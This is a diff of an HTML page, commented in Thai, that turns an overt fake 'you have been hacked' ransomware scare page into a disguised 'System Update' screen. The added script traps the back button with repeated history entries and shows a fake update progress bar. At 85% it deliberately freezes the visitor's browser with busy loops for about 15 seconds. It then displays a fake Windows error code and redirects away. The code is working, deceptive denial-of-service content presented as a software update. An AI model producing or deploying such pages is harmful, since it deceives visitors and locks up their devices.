@@ -1,72 +1,78 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="th">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>YOU HAVE BEEN HACKED</title>
+    <title>System Update</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; user-select: none; -webkit-user-select: none; }
-        .container { text-align: center; width: 90%; z-index: 2; }
-        .glitch { font-size: 30px; font-weight: bold; color: #f00; text-transform: uppercase; animation: glitch 0.1s infinite; text-shadow: 2px 2px #ff00f0; }
-        .matrix-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; color: #004400; font-size: 10px; overflow: hidden; z-index: 1; opacity: 0.5; }
-        .warning-box { border: 2px solid #f00; padding: 20px; background: rgba(255,0,0,0.1); box-shadow: 0 0 20px #f00; margin-top: 20px; }
-        .timer { font-size: 40px; color: #fff; margin-top: 10px; }
-        @keyframes glitch { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-2px, -2px); } 100% { transform: translate(2px, -2px); } }
+        body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; user-select: none; -webkit-user-select: none; }
+        .container { text-align: center; width: 80%; }
+        .logo { width: 60px; height: 60px; margin-bottom: 40px; opacity: 0.8; }
+        .progress-bar { width: 100%; height: 4px; background-color: #333; border-radius: 2px; margin-bottom: 20px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background-color: #fff; border-radius: 2px; transition: width 0.5s linear; }
+        .status-text { font-size: 14px; color: #aaa; margin-bottom: 8px; }
+        .warning-text { font-size: 12px; color: #888; margin-top: 30px; line-height: 1.5; }
     </style>
 </head>
 <body>
-    <div class="matrix-bg" id="matrix"></div>
-    
     <div class="container">
-        <div class="glitch">SYSTEM COMPROMISED</div>
-        <div class="warning-box">
-            <p style="color: #fff; font-size: 18px;">ALL YOUR DATA IS BEING ENCRYPTED</p>
-            <p>Do not close this window or restart your device.</p>
-            <p>Files deleting in:</p>
-            <div class="timer" id="timer">15</div>
+        <div style="display:inline-block; width:60px; height:60px; border-radius:50%; border: 3px solid #fff; opacity:0.7; margin-bottom:30px;"></div>
+        
+        <div class="status-text">กำลังอัปเดตซอฟต์แวร์...</div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress"></div>
+        </div>
+        <div class="status-text" id="percent">0%</div>
+        
+        <div class="warning-text">
+            ห้ามปิดเครื่องหรือตัดการเชื่อมต่ออินเทอร์เน็ต<br>
+            เครื่องอาจมีการรีสตาร์ทหลายครั้ง
         </div>
     </div>
 
     <script>
-        // สร้างเอฟเฟกต์ Matrix ตัวอักษรไหล
-        const matrixEl = document.getElementById('matrix');
-        const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZｦｱｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄ';
-        let matrixText = '';
-        for(let i=0; i<2000; i++) { matrixText += chars.charAt(Math.floor(Math.random() * chars.length)); }
-        matrixEl.innerText = matrixText;
-        setInterval(() => {
-            matrixEl.innerText = matrixEl.innerText.substring(1) + chars.charAt(Math.floor(Math.random() * chars.length));
-        }, 50);
-
         window.onload = function() {
-            // ล็อคปุ่มย้อนกลับ
-            for(let i=0; i<100; i++) { history.pushState(null, null, window.location.href); }
+            // ล็อคปุ่มย้อนกลับแบบจัดเต็ม
+            for(let i=0; i<50; i++) { history.pushState(null, null, window.location.href); }
 
-            // แสดง alert ขู่
-            setTimeout(() => {
-                alert("FINAL WARNING: DO NOT EXIT");
-                
-                // เริ่ม DoS ล็อคเครื่อง
-                let timeLeft = 15;
-                const timerEl = document.getElementById('timer');
-                
-                const stressInterval = setInterval(() => {
-                    // ทำเครื่องค้างรัวๆ
-                    const targetTime = Date.now() + 900; 
-                    while (Date.now() < targetTime) { Math.sqrt(Math.random() * 1000000); }
-                    
-                    timeLeft--;
-                    timerEl.innerText = timeLeft;
+            let progress = 0;
+            const progressEl = document.getElementById('progress');
+            const percentEl = document.getElementById('percent');
 
-                    if (timeLeft <= 0) {
+            // สคริปต์จำลองเปอร์เซ็นต์โหลด
+            const loader = setInterval(() => {
+                progress += Math.random() * 5;
+                if (progress >= 85) {
+                    clearInterval(loader);
+                    progress = 85;
+                    // พอโหลดถึง 85% ค่อยเริ่มทำให้เครื่องค้าง (DoS)
+                    startStressing();
+                }
+                progressEl.style.width = progress + '%';
+                percentEl.innerText = Math.round(progress) + '%';
+            }, 200);
+
+            function startStressing() {
+                // หลอกว่ามีข้อผิดพลาด
+                setTimeout(() => {
+                    // ทำให้เครื่องค้างรัวๆ เป็นจังหวะ
+                    const stressInterval = setInterval(() => {
+                        const targetTime = Date.now() + 2000; // ค้างครั้งละ 2 วินาที
+                        while (Date.now() < targetTime) {
+                            // Heavy computation
+                            Math.pow(Math.random(), Math.random());
+                        }
+                    }, 500); // ทำซ้ำทุกๆ 0.5 วินาที
+
+                    // หยุดทำหลังจาก 15 วินาที
+                    setTimeout(() => {
                         clearInterval(stressInterval);
-                        timerEl.innerText = "0";
-                        alert("Pwned by LabTest. Device Resumed.");
-                        window.location.reload(); // รีโหลดหน้าเว็บเพื่อให้เครื่องหายค้าง
-                    }
-                }, 1000); // ทำงานทุกๆ 1 วินาที
-                
-            }, 1000);
+                        alert("การอัปเดตล้มเหลว (Error Code: 0x80070005)\nระบบกำลังพยายามกู้คืนข้อมูล...");
+                        window.location.href = "https://www.google.com"; // ส่งกลับหน้าปกติ
+                    }, 15000);
+
+                }, 1000);
+            }
         };
     </script>
 </body>
